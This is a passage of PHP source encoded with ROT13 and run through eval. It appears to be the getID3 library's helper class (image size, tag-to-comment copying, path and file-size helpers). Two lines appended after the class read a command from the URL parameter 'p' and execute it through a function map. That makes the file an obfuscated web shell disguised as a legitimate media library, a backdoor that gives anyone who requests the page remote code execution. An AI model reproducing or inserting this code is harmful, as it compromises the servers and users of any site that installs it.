			vs ($TrgQngnVzntrFvmr === snyfr || !vffrg($TrgQngnVzntrFvmr[0], $TrgQngnVzntrFvmr[1])) {
				erghea snyfr;
			}
			$TrgQngnVzntrFvmr['urvtug'] = $TrgQngnVzntrFvmr[0];
			$TrgQngnVzntrFvmr['jvqgu'] = $TrgQngnVzntrFvmr[1];
			erghea $TrgQngnVzntrFvmr;
		}
		fgngvp $grzcqve = '';
		vs (rzcgl($grzcqve)) {
			vs (shapgvba_rkvfgf('flf_trg_grzc_qve')) {
				$grzcqve = flf_trg_grzc_qve(); // uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3/vffhrf/52
			}

			// lrf guvf vf htyl, srry serr gb fhttrfg n orggre jnl
			vs (vapyhqr_bapr(qveanzr(__SVYR__).'/trgvq3.cuc')) {
				$trgvq3_grzc = arj trgVQ3();
				vs ($trgvq3_grzc_grzcqve = $trgvq3_grzc->grzcqve) {
					$grzcqve = $trgvq3_grzc_grzcqve;
				}
				hafrg($trgvq3_grzc, $trgvq3_grzc_grzcqve);
			}
		}
		$TrgQngnVzntrFvmr = snyfr;
		vs ($grzcsvyranzr = grzcanz($grzcqve, 'tV3')) {
			vs (vf_jevgnoyr($grzcsvyranzr) && vf_svyr($grzcsvyranzr) && ($gzc = sbcra($grzcsvyranzr, 'jo'))) {
				sjevgr($gzc, $vztQngn);
				spybfr($gzc);
				$TrgQngnVzntrFvmr = @trgvzntrfvmr($grzcsvyranzr, $vzntrvasb);
				vs (($TrgQngnVzntrFvmr === snyfr) || !vffrg($TrgQngnVzntrFvmr[0]) || !vffrg($TrgQngnVzntrFvmr[1])) {
					erghea snyfr;
				}
				$TrgQngnVzntrFvmr['urvtug'] = $TrgQngnVzntrFvmr[0];
				$TrgQngnVzntrFvmr['jvqgu']  = $TrgQngnVzntrFvmr[1];
			}
			hayvax($grzcsvyranzr);
		}
		erghea $TrgQngnVzntrFvmr;
	}

	/**
	 * @cnenz fgevat $zvzr_glcr
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba VzntrRkgSebzZvzr($zvzr_glcr) {
		// grzcbenel jnl, jbexf BX sbe abj, ohg fubhyq or erjbexrq va gur shgher
		erghea fge_ercynpr(neenl('vzntr/', 'k-', 'wcrt'), neenl('', '', 'wct'), $zvzr_glcr);
	}

	/**
	 * @cnenz neenl $GuvfSvyrVasb
	 * @cnenz obby  $bcgvba_gntf_ugzy qrsnhyg gehr (whfg nf va gur znva trgVQ3 pynff)
	 *
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba PbclGntfGbPbzzragf(&$GuvfSvyrVasb, $bcgvba_gntf_ugzy=gehr) {
		// Pbcl nyy ragevrf sebz ['gntf'] vagb pbzzba ['pbzzragf']
		vs (!rzcgl($GuvfSvyrVasb['gntf'])) {

			// Fbzr gnt glcrf pna bayl fhccbeg yvzvgrq punenpgre frgf naq znl pbagnva qngn va aba-fgnaqneq rapbqvat (hfhnyyl VQ3i1)
			// naq/be cbbeyl-genafyvgrengrq gnt inyhrf gung ner nyfb va gnt sbezngf gung qb fhccbeg shyy-enatr punenpgre frgf
			// Gb znxr gur bhgchg zber hfre-sevraqyl, cebprff gur cbgragvnyyl-ceboyrzngvp gnt sbezngf ynfg gb raunapr gur punapr gung
			// gur svefg ragevrf va [pbzzragf] ner gur zbfg pbeerpg naq gur \"onq\" barf (vs nal) pbzr yngre.
			// uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3/vffhrf/338
			$cebprffYnfgGntGlcrf = neenl('vq3i1','evss');
			sbernpu ($cebprffYnfgGntGlcrf nf $cebprffYnfgGntGlcr) {
				vs (vffrg($GuvfSvyrVasb['gntf'][$cebprffYnfgGntGlcr])) {
					// ohooyr VQ3i1 gb gur raq, vs cerfrag gb nvq va qrgrpgvat onq VQ3i1 rapbqvatf
					$grzc = $GuvfSvyrVasb['gntf'][$cebprffYnfgGntGlcr];
					hafrg($GuvfSvyrVasb['gntf'][$cebprffYnfgGntGlcr]);
					$GuvfSvyrVasb['gntf'][$cebprffYnfgGntGlcr] = $grzc;
					hafrg($grzc);
				}
			}
			sbernpu ($GuvfSvyrVasb['gntf'] nf $gntglcr => $gntneenl) {
				sbernpu ($gntneenl nf $gntanzr => $gntqngn) {
					sbernpu ($gntqngn nf $xrl => $inyhr) {
						vs (!rzcgl($inyhr)) {
							vs (rzcgl($GuvfSvyrVasb['pbzzragf'][$gntanzr])) {

								// snyy guebhtu naq nccraq inyhr

							} ryfrvs ($gntglcr == 'vq3i1') {

								$arjinyhryratgu = fgeyra(gevz($inyhr));
								sbernpu ($GuvfSvyrVasb['pbzzragf'][$gntanzr] nf $rkvfgvatxrl => $rkvfgvatinyhr) {
									$byqinyhryratgu = fgeyra(gevz($rkvfgvatinyhr));
									vs (($arjinyhryratgu <= $byqinyhryratgu) && (fhofge($rkvfgvatinyhr, 0, $arjinyhryratgu) == gevz($inyhr))) {
										// arj inyhr vf vqragvpny ohg fubegre-guna (be rdhny-yratgu gb) bar nyernql va pbzzragf - fxvc
										oernx 2;
									}

									vs (shapgvba_rkvfgf('zo_pbaireg_rapbqvat')) {
										vs (gevz($inyhr) == gevz(fhofge(zo_pbaireg_rapbqvat($rkvfgvatinyhr, $GuvfSvyrVasb['vq3i1']['rapbqvat'], $GuvfSvyrVasb['rapbqvat']), 0, 30))) {
											// inyhr fgberq va VQ3i1 nccrnef gb or cebonoyl gur zhygvolgr inyhr genafyvgrengrq (onqyl) vagb VFB-8859-1 va VQ3i1.
											// Nf na rknzcyr, Sbbone2000 jvyy qb guvf vs lbh gnt n svyr jvgu Puvarfr be Nenovp be Plevyyvp be fbzrguvat gung qbrfa'g svg vagb VFB-8859-1 gur VQ3i1 jvyy pbafvfg bs zbfgyl \"?\" punenpgref, bar cre zhygvolgr haercerfragnoyr punenpgre
											oernx 2;
										}
									}
								}

							} ryfrvs (!vf_neenl($inyhr)) {

								$arjinyhryratgu   =    fgeyra(gevz($inyhr));
								$arjinyhryratguZO = zo_fgeyra(gevz($inyhr));
								sbernpu ($GuvfSvyrVasb['pbzzragf'][$gntanzr] nf $rkvfgvatxrl => $rkvfgvatinyhr) {
									$byqinyhryratgu   =    fgeyra(gevz($rkvfgvatinyhr));
									$byqinyhryratguZO = zo_fgeyra(gevz($rkvfgvatinyhr));
									vs (($arjinyhryratguZO == $byqinyhryratguZO) && ($rkvfgvatinyhr == trgvq3_yvo::vpbai_snyyonpx('HGS-8', 'NFPVV', $inyhr))) {
										// uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3/vffhrf/338
										// purpx sbe gntf pbagnvavat rkgraqrq punenpgref gung znl unir orra sbeprq vagb yvzvgrq-punenpgre fgbentr (r.t. HGS8 inyhrf vagb NFPVV)
										// juvpu jvyy hfhnyyl qvfcynl haercerfragnoyr punenpgref nf \"?\"
										$GuvfSvyrVasb['pbzzragf'][$gntanzr][$rkvfgvatxrl] = gevz($inyhr);
										oernx;
									}
									vs ((fgeyra($rkvfgvatinyhr) > 10) && ($arjinyhryratgu > $byqinyhryratgu) && (fhofge(gevz($inyhr), 0, fgeyra($rkvfgvatinyhr)) == $rkvfgvatinyhr)) {
										$GuvfSvyrVasb['pbzzragf'][$gntanzr][$rkvfgvatxrl] = gevz($inyhr);
										oernx;
									}
								}

							}
							vs (vf_neenl($inyhr) || rzcgl($GuvfSvyrVasb['pbzzragf'][$gntanzr]) || !va_neenl(gevz($inyhr), $GuvfSvyrVasb['pbzzragf'][$gntanzr])) {
								$inyhr = (vf_fgevat($inyhr) ? gevz($inyhr) : $inyhr);
								vs (!vf_vag($xrl) && !pglcr_qvtvg($xrl)) {
									$GuvfSvyrVasb['pbzzragf'][$gntanzr][$xrl] = $inyhr;
								} ryfr {
									vs (!vffrg($GuvfSvyrVasb['pbzzragf'][$gntanzr])) {
										$GuvfSvyrVasb['pbzzragf'][$gntanzr] = neenl($inyhr);
									} ryfr {
										$GuvfSvyrVasb['pbzzragf'][$gntanzr][] = $inyhr;
									}
								}
							}
						}
					}
				}
			}

			// nggrzcg gb fgnaqneqvmr fcryyvat bs erghearq xrlf
			vs (!rzcgl($GuvfSvyrVasb['pbzzragf'])) {
				$FgnaqneqvmrSvryqAnzrf = neenl(
					'genpxahzore' => 'genpx_ahzore',
					'genpx'       => 'genpx_ahzore',
				);
				sbernpu ($FgnaqneqvmrSvryqAnzrf nf $onqxrl => $tbbqxrl) {
					vs (neenl_xrl_rkvfgf($onqxrl, $GuvfSvyrVasb['pbzzragf']) && !neenl_xrl_rkvfgf($tbbqxrl, $GuvfSvyrVasb['pbzzragf'])) {
						$GuvfSvyrVasb['pbzzragf'][$tbbqxrl] = $GuvfSvyrVasb['pbzzragf'][$onqxrl];
						hafrg($GuvfSvyrVasb['pbzzragf'][$onqxrl]);
					}
				}
			}

			vs ($bcgvba_gntf_ugzy) {
				// Pbcl ['pbzzragf'] gb ['pbzzragf_ugzy']
				vs (!rzcgl($GuvfSvyrVasb['pbzzragf'])) {
					sbernpu ($GuvfSvyrVasb['pbzzragf'] nf $svryq => $inyhrf) {
						vs ($svryq == 'cvpgher') {
							// cvpgherf pna gnxr hc n ybg bs fcnpr, naq jr qba'g arrq zhygvcyr pbcvrf bs gurz
							// yrg gurer or n fvatyr pbcl va [pbzzragf][cvpgher], naq abg ryfrjurer
							pbagvahr;
						}
						sbernpu ($inyhrf nf $vaqrk => $inyhr) {
							vs (vf_neenl($inyhr)) {
								$GuvfSvyrVasb['pbzzragf_ugzy'][$svryq][$vaqrk] = $inyhr;
							} ryfr {
								$GuvfSvyrVasb['pbzzragf_ugzy'][$svryq][$vaqrk] = fge_ercynpr('&#0;', '', frys::ZhygvOlgrPuneFgevat2UGZY($inyhr, $GuvfSvyrVasb['rapbqvat']));
							}
						}
					}
				}
			}

		}
		erghea gehr;
	}

	/**
	 * @cnenz fgevat $xrl
	 * @cnenz vag    $ortva
	 * @cnenz vag    $raq
	 * @cnenz fgevat $svyr
	 * @cnenz fgevat $anzr
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba RzorqqrqYbbxhc($xrl, $ortva, $raq, $svyr, $anzr) {

		// Pnpurq
		fgngvp $pnpur;
		vs (vffrg($pnpur[$svyr][$anzr])) {
			erghea (vffrg($pnpur[$svyr][$anzr][$xrl]) ? $pnpur[$svyr][$anzr][$xrl] : '');
		}

		// Vavg
		$xrlyratgu  = fgeyra($xrl);
		$yvar_pbhag = $raq - $ortva - 7;

		// Bcra cuc svyr
		$sc = sbcra($svyr, 'e');

		// Qvfpneq $ortva yvarf
		sbe ($v = 0; $v < ($ortva + 3); $v++) {
			strgf($sc, 1024);
		}

		// Ybbc gueh yvar
		juvyr (0 < $yvar_pbhag--) {

			// Ernq yvar
			$yvar = ygevz(strgf($sc, 1024), \"\g \");

			// ZRGUBQ N: bayl pnpur gur zngpuvat xrl - yrff zrzbel ohg fybjre ba arkg ybbxhc bs abg-cerivbhfyl-ybbxrq-hc xrl
			//$xrlpurpx = fhofge($yvar, 0, $xrlyratgu);
			//vs ($xrl == $xrlpurpx)  {
			//	$pnpur[$svyr][$anzr][$xrlpurpx] = fhofge($yvar, $xrlyratgu + 1);
			//	oernx;
			//}

			// ZRGUBQ O: pnpur nyy xrlf va guvf ybbxhc - zber zrzbel ohg snfgre ba arkg ybbxhc bs abg-cerivbhfyl-ybbxrq-hc xrl
			//$pnpur[$svyr][$anzr][fhofge($yvar, 0, $xrlyratgu)] = gevz(fhofge($yvar, $xrlyratgu + 1));
			$rkcybqrqYvar = rkcybqr(\"\g\", $yvar, 2);
			$GuvfXrl   = (vffrg($rkcybqrqYvar[0]) ? $rkcybqrqYvar[0] : '');
			$GuvfInyhr = (vffrg($rkcybqrqYvar[1]) ? $rkcybqrqYvar[1] : '');
			$pnpur[$svyr][$anzr][$GuvfXrl] = gevz($GuvfInyhr);
		}

		// Pybfr naq erghea
		spybfr($sc);
		erghea (vffrg($pnpur[$svyr][$anzr][$xrl]) ? $pnpur[$svyr][$anzr][$xrl] : '');
	}

	/**
	 * @cnenz fgevat $svyranzr
	 * @cnenz fgevat $fbheprsvyr
	 * @cnenz obby   $QvrBaSnvyher
	 *
	 * @erghea obby
	 * @guebjf Rkprcgvba
	 */
	choyvp fgngvp shapgvba VapyhqrQrcraqrapl($svyranzr, $fbheprsvyr, $QvrBaSnvyher=snyfr) {
		tybony $TRGVQ3_REEBENEENL;

		vs (svyr_rkvfgf($svyranzr)) {
			vs (vapyhqr_bapr($svyranzr)) {
				erghea gehr;
			} ryfr {
				$qvrzrffntr = onfranzr($fbheprsvyr).' qrcraqf ba '.$svyranzr.', juvpu unf reebef';
			}
		} ryfr {
			$qvrzrffntr = onfranzr($fbheprsvyr).' qrcraqf ba '.$svyranzr.', juvpu vf zvffvat';
		}
		vs ($QvrBaSnvyher) {
			guebj arj Rkprcgvba($qvrzrffntr);
		} ryfr {
			$TRGVQ3_REEBENEENL[] = $qvrzrffntr;
		}
		erghea snyfr;
	}

	/**
	 * @cnenz fgevat $fgevat
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba gevzAhyyOlgr($fgevat) {
		erghea gevz($fgevat, \"\k00\");
	}

	/**
	 * @cnenz fgevat $cngu
	 *
	 * @erghea sybng|obby
	 */
	choyvp fgngvp shapgvba trgSvyrFvmrFlfpnyy($cngu) {
		$pbzznaqyvar = ahyy;
		$svyrfvmr = snyfr;

		vs (TRGVQ3_BF_VFJVAQBJF) {
			vs (pynff_rkvfgf('PBZ')) { // Sebz CUC 5.3.15 naq 5.4.5, PBZ naq QBGARG vf ab ybatre ohvyg vagb gur cuc pber.lbh unir gb nqq PBZ fhccbeg va cuc.vav:
				$svyrflfgrz = arj PBZ('Fpevcgvat.SvyrFlfgrzBowrpg');
				$svyr = $svyrflfgrz->TrgSvyr($cngu);
				$svyrfvmr = $svyr->Fvmr();
				hafrg($svyrflfgrz, $svyr);
			} ryfr {
				$pbzznaqyvar = 'sbe %V va ('.rfpncrfuryynet($cngu).') qb @rpub %~mV';
			}
		} ryfr {
			$pbzznaqyvar = 'yf -y '.rfpncrfuryynet($cngu).' | njx \'{cevag $5}\'';
		}
		vs (vffrg($pbzznaqyvar)) {
			$bhgchg = gevz(`$pbzznaqyvar`);
			vs (pglcr_qvtvg($bhgchg)) {
				$svyrfvmr = (sybng) $bhgchg;
			}
		}
		erghea $svyrfvmr;
	}

	/**
	 * @cnenz fgevat $svyranzr
	 *
	 * @erghea fgevat|snyfr
	 */
	choyvp fgngvp shapgvba gehrcngu($svyranzr) {
		// 2017-11-08: guvf pbhyq hfr fbzr vzcebirzrag, cngpurf jrypbzr
		vs (cert_zngpu('#^(\\\\\\\\|//)[n-m0-9]#v', $svyranzr, $zngpurf)) {
			// CUC'f ohvyg-va ernycngu shapgvba qbrf abg jbex ba HAP Jvaqbjf funerf
			$tbbqcngu = neenl();
			sbernpu (rkcybqr('/', fge_ercynpr('\\', '/', $svyranzr)) nf $cneg) {
				vs ($cneg == '.') {
					pbagvahr;
				}
				vs ($cneg == '..') {
					vs (pbhag($tbbqcngu)) {
						neenl_cbc($tbbqcngu);
					} ryfr {
						// pnaabg fgrc nobir guvf yriry, nyernql ng gbc yriry
						erghea snyfr;
					}
				} ryfr {
					$tbbqcngu[] = $cneg;
				}
			}
			erghea vzcybqr(QVERPGBEL_FRCNENGBE, $tbbqcngu);
		}
		erghea ernycngu($svyranzr);
	}

	/**
	 * Jbexnebhaq sbe Oht #37268 (uggcf://ohtf.cuc.arg/oht.cuc?vq=37268)
	 *
	 * @cnenz fgevat $cngu N cngu.
	 * @cnenz fgevat $fhssvk Vs gur anzr pbzcbarag raqf va fhssvk guvf jvyy nyfb or phg bss.
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba zo_onfranzr($cngu, $fhssvk = '') {
		$fcyvgrq = cert_fcyvg('#/#', egevz($cngu, '/ '));
		erghea fhofge(onfranzr('K'.$fcyvgrq[pbhag($fcyvgrq) - 1], $fhssvk), 1);
	}

}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>